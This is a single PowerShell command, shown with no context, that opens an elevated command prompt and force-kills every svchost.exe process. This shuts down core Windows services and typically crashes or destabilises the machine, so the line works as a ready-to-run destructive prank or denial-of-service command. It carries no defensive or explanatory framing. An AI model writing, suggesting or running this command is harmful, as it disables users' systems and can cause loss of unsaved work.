Start-Process "cmd.exe" -Verb RunAs -ArgumentList '/k taskkill /im svchost.exe /f & pause'
